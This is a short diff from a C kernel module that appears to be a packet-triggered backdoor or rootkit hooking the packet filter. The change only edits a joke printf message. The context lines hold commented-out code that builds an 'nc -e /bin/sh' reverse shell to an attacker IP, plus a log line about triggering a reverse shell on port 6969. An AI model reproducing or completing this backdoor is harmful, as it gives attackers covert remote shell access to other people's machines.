@@ -75,7 +75,7 @@ static pfil_return_t my_packet_filter(struct mbuf **mp, struct ifnet *ifp, int d
     //snprintf(reverse_shell_cmd, sizeof(reverse_shell_cmd),
        // "nc -e /bin/sh %s %d", attacker_ip_str, TRIGGER_PORT);
 
-    printf("ChatGPT is in your'e walls 🤖\n");
+    printf("ChatGPT is in your'e walls \n");
    
     //printf("%s\n", reverse_shell_cmd);
     //printf("[LKM] Triggering reverse shell to %s on port 6969\n", attacker_ip_str);
